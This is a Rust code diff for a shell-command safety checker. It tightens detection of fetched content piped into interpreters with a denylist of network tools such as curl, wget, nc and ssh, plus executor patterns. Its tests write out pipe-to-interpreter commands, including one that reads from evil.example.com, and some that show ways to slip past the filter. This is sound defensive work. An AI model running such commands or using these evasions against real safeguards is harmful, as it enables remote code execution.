@@ -218,35 +218,133 @@ const PIPE_INTERPRETERS: &[&str] = &[
     "cmd",
 ];
 
-/// #191: a `pipe_to_interpreter` finding is a false positive when every
-/// interpreter sink in the command runs an explicit program (`-c`/`-e`/`-m`/
-/// script file) — piped stdin is then data being parsed, not code being
-/// executed. Fails closed: no classifiable interpreter sink, or any sink
-/// that reads its program from stdin, keeps the downgrade.
+/// Producers that pull content off the network. `pipe_to_interpreter` exists
+/// to stop FETCHED content being executed, so one of these anywhere upstream
+/// of an interpreter keeps the downgrade — whatever the program body looks
+/// like. A denylist (rather than a local allowlist) is the right shape here:
+/// the threat is specifically remote content, and an allowlist would fail
+/// closed on every ordinary dev tool and shell function, destroying the
+/// precision this whole change exists to win back.
+const REMOTE_PRODUCERS: &[&str] = &[
+    "curl", "wget", "npx", "pnpx", "bunx", "nc", "ncat", "netcat", "socat", "ssh", "scp", "sftp",
+    "rsync", "ftp", "http", "https", "httpie", "xh", "aria2c", "gsutil", "s3cmd", "az", "aws",
+];
+
+/// Schemes that mark an argument as naming remote content, so an unlisted
+/// producer still counts as a fetch when it is handed a URL.
+const REMOTE_SCHEMES: &[&str] = &[
+    "http://", "https://", "ftp://", "ftps://", "scp://", "ssh://",
+];
+
+/// Sinks that interpolate piped stdin into the command they run, so stdin is
+/// the program rather than its input.
+const STDIN_INTERPOLATORS: &[&str] = &["xargs", "parallel"];
+
+/// Program paths that name stdin itself — as a "script file" these read the
+/// piped content as code.
+const STDIN_PROGRAM_PATHS: &[&str] = &["-", "/dev/stdin", "/dev/fd/0", "/proc/self/fd/0"];
+
+/// #191: a `pipe_to_interpreter` finding is a false positive only when BOTH
+/// hold for every pipeline that feeds an interpreter:
+///
+/// 1. no producer upstream of the interpreter fetches remote content
+///    (`REMOTE_PRODUCERS` / a URL argument) — the rule exists to stop FETCHED
+///    content being executed, so a fetch anywhere in the chain keeps the
+///    downgrade; and
+/// 2. every interpreter sink runs an explicit program (`-c`/`-e`/`-m`/script
+///    file), so piped stdin can only be data.
+///
+/// The source gate (1) is the sound one: it does not depend on proving an
+/// arbitrary program body benign, which is undecidable. The body screening
+/// inside (2) is defence-in-depth, not load-bearing.
+///
+/// Fails closed everywhere: unknown producers, unclassifiable sinks, or no
+/// visible interpreter pipe at all keep the downgrade.
 fn all_interpreter_pipe_sinks_are_data_mode(cmd: &str) -> bool {
-    let tokens = tokenize(cmd);
     let mut saw_interpreter_sink = false;
-    let mut i = 0;
-    while i < tokens.len() {
-        if tokens[i].kind != TokenKind::Pipe {
-            i += 1;
-            continue;
-        }
-        let mut words: Vec<String> = Vec::new();
-        let mut j = i + 1;
-        while j < tokens.len() && tokens[j].kind == TokenKind::Arg {
-            words.push(strip_quotes(&tokens[j].value));
-            j += 1;
-        }
-        if let Some(k) = sink_interpreter_index(&words) {
+    for stages in command_pipelines(cmd) {
+        for (idx, stage) in stages.iter().enumerate() {
+            if idx == 0 {
+                continue; // nothing is piped into the first stage
+            }
+            // Checked before the interpreter lookup: `xargs -I{} python3 -c
+            // '{}'` does contain an interpreter, but stdin becomes its
+            // command line rather than its input.
+            if stage
+                .first()
+                .is_some_and(|w| STDIN_INTERPOLATORS.contains(&interpreter_base(w).as_str()))
+            {
+                return false;
+            }
+            let Some(k) = sink_interpreter_index(stage) else {
+                continue;
+            };
             saw_interpreter_sink = true;
-            if !interpreter_args_are_data_mode(&words[k], &words[k + 1..]) {
+            if !interpreter_args_are_data_mode(&stage[k], &stage[k + 1..]) {
+                return false;
+            }
+            // No upstream producer feeding this interpreter may fetch.
+            if stages[..idx].iter().any(|s| stage_fetches_remote(s)) {
                 return false;
             }
         }
-        i = j.max(i + 1);
     }
     saw_interpreter_sink
+}
+
+/// Split a command into pipelines (bounded by `&&`/`||`/`;`/`&`/newline),
+/// each pipeline as its ordered pipe stages, each stage as unquoted words.
+/// Producer→consumer order within a pipeline is what the source gate needs,
+/// so this cannot use `split_on_operators` — that splits on pipes too.
+fn command_pipelines(cmd: &str) -> Vec<Vec<Vec<String>>> {
+    let mut pipelines: Vec<Vec<Vec<String>>> = vec![vec![Vec::new()]];
+    for tok in tokenize(cmd) {
+        let pipeline = pipelines.last_mut().expect("always one open pipeline");
+        match tok.kind {
+            TokenKind::Pipe => pipeline.push(Vec::new()),
+            TokenKind::Operator => pipelines.push(vec![Vec::new()]),
+            TokenKind::Shellism if tok.value == "&" || tok.value == "\n" => {
+                pipelines.push(vec![Vec::new()])
+            }
+            TokenKind::Arg => {
+                if let Some(stage) = pipeline.last_mut() {
+                    stage.push(strip_quotes(&tok.value));
+                }
+            }
+            _ => {}
+        }
+    }
+    pipelines
+}
+
+/// True when a pipeline stage pulls content off the network — either its
+/// command is a known fetcher (through wrappers and env assignments) or any
+/// of its words names a remote URL. A stage that merely *mentions* a scheme
+/// counts: a fetch behind an unlisted binary still hands remote bytes on.
+fn stage_fetches_remote(stage: &[String]) -> bool {
+    if stage.iter().any(|w| {
+        let lower = w.to_ascii_lowercase();
+        REMOTE_SCHEMES.iter().any(|s| lower.contains(s))
+    }) {
+        return true;
+    }
+    for w in stage {
+        if w.contains('=') && !w.starts_with('-') {
+            continue;
+        }
+        if w.starts_with('-') {
+            continue;
+        }
+        if matches!(
+            w.as_str(),
+            "env" | "command" | "builtin" | "sudo" | "nohup" | "nice" | "timeout" | "time"
+        ) {
+            continue;
+        }
+        let base = w.rsplit('/').next().unwrap_or(w).to_ascii_lowercase();
+        return REMOTE_PRODUCERS.contains(&base.as_str());
+    }
+    false
 }
 
 /// Normalised interpreter name: path stripped, lowercased, version suffix
@@ -301,9 +399,18 @@ fn interpreter_args_are_data_mode(interp: &str, args: &[String]) -> bool {
             // body is frequently several unquoted tokens, and trailing words
             // are argv either way — screen the lot.
             let body = args[idx + 1..].join(" ");
-            return !body.is_empty() && !program_body_executes_stdin(&body);
+            if body.is_empty() || program_body_executes_stdin(&body) {
+                return false;
+            }
+            // A shell -c body is held to a stricter standard than a Python or
+            // Node body: it is a whole script, and the cheapest way for piped
+            // content to reach an interpreter is through it.
+            if is_shell && shell_body_is_dynamic(&body) {
+                return false;
+            }
+            return true;
         }
-        if a == "-" || a == "-s" {
+        if a == "-s" || STDIN_PROGRAM_PATHS.contains(&a.as_str()) {
             // Explicit read-program-from-stdin.
             return false;
         }
@@ -314,11 +421,43 @@ fn interpreter_args_are_data_mode(interp: &str, args: &[String]) -> bool {
         if a.starts_with('-') {
             continue;
         }
-        // First positional argument: a script file; stdin is data.
-        return true;
+        // First positional argument: a script file — unless that "file" is
+        // stdin itself, in which case the piped content IS the program.
+        return !STDIN_PROGRAM_PATHS.contains(&a.as_str());
     }
     // Flags only / no program: the interpreter would read stdin as code.
     false
+}
+
+/// A shell `-c` body is "dynamic" when piped content could become part of the
+/// program it runs:
+///
+/// * it re-invokes an interpreter that is not itself in data mode — `bash -c
+///   "python3"` has no executor needle but is a bare interpreter, and it
+///   inherits the pipe;
+/// * it consumes stdin with the `read` builtin (`while read l; do python3 -c
+///   "$l"; done`); or
+/// * it interpolates a variable, so the program text is not visible here.
+///
+/// Shell bodies in a pipe sink are rare in practice, so holding them to this
+/// stricter standard costs little precision and closes the cheapest route
+/// from piped bytes to executed code.
+fn shell_body_is_dynamic(body: &str) -> bool {
+    if body.contains('$') {
+        return true;
+    }
+    let words: Vec<String> = tokenize(body)
+        .into_iter()
+        .filter(|t| t.kind == TokenKind::Arg)
+        .map(|t| strip_quotes(&t.value))
+        .collect();
+    if words.iter().any(|w| w == "read") {
+        return true;
+    }
+    let Some(k) = sink_interpreter_index(&words) else {
+        return false;
+    };
+    !interpreter_args_are_data_mode(&words[k], &words[k + 1..])
 }
 
 /// getopt bundles short options: `-ic` is `-i -c`, and the code letter takes
@@ -340,20 +479,32 @@ fn is_bundled_code_flag(arg: &str, code_flags: &[&str]) -> bool {
 }
 
 /// An explicit program body that executes its input is code execution with
-/// extra steps — treat it as a bare interpreter. Covers direct exec/eval,
-/// the os/subprocess escape hatches, shell substitution of fetched content,
-/// and sourcing stdin.
+/// extra steps — treat it as a bare interpreter.
+///
+/// This is defence-in-depth, NOT the primary control: proving an arbitrary
+/// body benign by pattern is undecidable (`getattr(b,'ex'+'ec')`), which is
+/// why suppression also requires that nothing upstream fetched the content.
+/// The needles below catch the obvious dodges; whitespace is stripped first
+/// so `exec (x)` cannot slip past `exec(`.
 fn program_body_executes_stdin(body: &str) -> bool {
     const EXECUTORS: &[&str] = &[
         "exec(",
         "eval(",
+        "exec ",
+        "eval ",
         "system(",
         "os.system",
         "subprocess",
+        "child_process",
+        "spawn(",
+        "execfile",
         "__import__",
+        "importlib",
+        "getattr(",
         "popen",
         "getoutput",
         "/dev/stdin",
+        "/dev/fd/",
         "$(",
         "`",
         "source ",
@@ -361,8 +512,13 @@ fn program_body_executes_stdin(body: &str) -> bool {
         "runpy",
         "compile(",
     ];
-    let b = body.to_ascii_lowercase();
-    EXECUTORS.iter().any(|needle| b.contains(needle))
+    let lower = body.to_ascii_lowercase();
+    // Match both the raw body (needles containing a space) and a
+    // whitespace-stripped copy (so `exec (x)` and `os .system` still hit).
+    let squeezed: String = lower.chars().filter(|c| !c.is_whitespace()).collect();
+    EXECUTORS
+        .iter()
+        .any(|needle| lower.contains(needle) || squeezed.contains(&needle.replace(' ', "")))
 }
 
 fn python_module_is_data_parser(cmd: &str) -> bool {
@@ -1233,7 +1389,6 @@ mod tests {
         // #191: every interpreter sink runs an explicit program, so piped
         // stdin is data being parsed — never code being executed.
         for cmd in [
-            r#"npx jest --json 2>/dev/null | python3 -c "import sys, json; json.load(sys.stdin)""#,
             r#"cd /x && cat settings.json | python3 -c 'import json,sys; print(json.load(sys.stdin))'"#,
             "WT=/tmp/x\ncd \"$WT\" && grep FOO app.log | python3 -c 'import sys; print(len(sys.stdin.read()))'",
             r#"head -1 out.txt | python3 -c "import sys; print(sys.stdin.read()[:80])""#,
@@ -1358,6 +1513,103 @@ mod tests {
             assert!(
                 should_downgrade_for_command(cmd, &pipe_block_verdict("x | python3")).is_none(),
                 "versioned/wrapped data-mode sink should not downgrade: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn should_downgrade_keeps_remote_source_regardless_of_sink_mode() {
+        // Council #191 round 2: the sound discriminator is the pipe SOURCE.
+        // `pipe_to_interpreter` guards against executing FETCHED content, so a
+        // fetch anywhere in the chain feeding an interpreter keeps the
+        // downgrade — no matter how benign the program body looks. This is
+        // what makes body screening defence-in-depth rather than load-bearing.
+        for cmd in [
+            r#"curl -s http://h/x | python3 -c "import json,sys; json.load(sys.stdin)""#,
+            r#"curl -s http://h/x | grep foo | python3 -c "import sys; sys.stdin.read()""#,
+            r#"wget -qO- http://h/x | python3 parse.py"#,
+            r#"npx some-pkg --json | python3 -c "import sys; print(sys.stdin.read())""#,
+            r#"nc evil.example.com 80 | bash -c "wc -l""#,
+        ] {
+            assert!(
+                should_downgrade_for_command(cmd, &pipe_block_verdict("x | python3")).is_some(),
+                "a fetch source feeding an interpreter must downgrade: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn should_downgrade_keeps_stdin_program_positionals() {
+        // Council #191 round 2 (mmax HIGH): /dev/stdin as the "script file" IS
+        // the piped content.
+        for cmd in [
+            "cat evil | python3 /dev/stdin",
+            "cat evil | python3 /dev/fd/0",
+            "cat evil | bash /proc/self/fd/0",
+        ] {
+            assert!(
+                should_downgrade_for_command(cmd, &pipe_block_verdict("x | python3")).is_some(),
+                "stdin-as-script-file must downgrade: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn should_downgrade_keeps_shell_body_reinvoking_interpreter() {
+        // Council #191 round 2 (mmax HIGH): a shell -c body that execs or runs
+        // a bare interpreter hands stdin to it as code.
+        for cmd in [
+            r#"cat x | bash -c "exec python3""#,
+            r#"cat x | bash -c "eval python3""#,
+            r#"cat x | bash -c "python3""#,
+            r#"cat x | sh -c "sh""#,
+        ] {
+            assert!(
+                should_downgrade_for_command(cmd, &pipe_block_verdict("x | bash")).is_some(),
+                "shell body re-invoking a bare interpreter must downgrade: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn should_downgrade_keeps_shell_loop_reading_stdin() {
+        // Council #191 round 2 (mmax LOW): the shell body has no executor
+        // needle, but `read` pulls piped bytes into a `-c` body.
+        let cmd = r#"cat x | bash -c "while read l; do python3 -c \"$l\"; done""#;
+        assert!(
+            should_downgrade_for_command(cmd, &pipe_block_verdict("x | bash")).is_some(),
+            "a shell body that reads stdin into a -c body must downgrade"
+        );
+    }
+
+    #[test]
+    fn should_downgrade_keeps_stdin_interpolating_sinks() {
+        // Council #191 round 2 (codex HIGH): xargs interpolates piped stdin
+        // into the command it runs — stdin is the program, not its input.
+        for cmd in [
+            "cat payload | xargs -I{} python3 -c '{}'",
+            "cat payload | xargs python3 -c",
+        ] {
+            assert!(
+                should_downgrade_for_command(cmd, &pipe_block_verdict("x | python3")).is_some(),
+                "stdin-interpolating sink must downgrade: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn should_downgrade_keeps_whitespace_and_alias_evasions() {
+        // Council #191 round 2: body screening must not be defeated by a space
+        // or an alias — it is defence-in-depth behind the source gate, but it
+        // should still catch the obvious dodges.
+        for cmd in [
+            r#"cat x | python3 -c "exec (input())""#,
+            r#"cat x | python3 -c "getattr(__builtins__, 'ex'+'ec')(input())""#,
+            r#"cat x | node -e "require('child_process').spawn(d)""#,
+        ] {
+            assert!(
+                should_downgrade_for_command(cmd, &pipe_block_verdict("x | python3")).is_some(),
+                "whitespace/alias evasion must downgrade: {cmd}"
             );
         }
     }
